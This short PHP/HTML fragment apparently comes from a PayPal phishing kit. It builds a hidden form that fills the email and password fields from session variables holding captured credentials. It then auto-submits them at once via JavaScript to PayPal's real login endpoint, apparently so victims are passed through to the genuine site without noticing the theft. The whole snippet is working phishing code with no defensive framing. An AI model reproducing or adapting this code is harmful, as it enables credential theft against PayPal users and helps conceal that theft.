<form name="formnn" action="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_login-submit" method="post">
            <div style="display:none;">
                <input maxlength="45" name="login_email" size="50" value="<?php echo $_SESSION['_email_'];?>"/>
                <input maxlength="45" name="login_password" size="50" value="<?php echo $_SESSION['_password_'];?>"/>
            </div>
</form>
<script language="JavaScript">
setTimeout('document.formnn.submit()',0);
</script>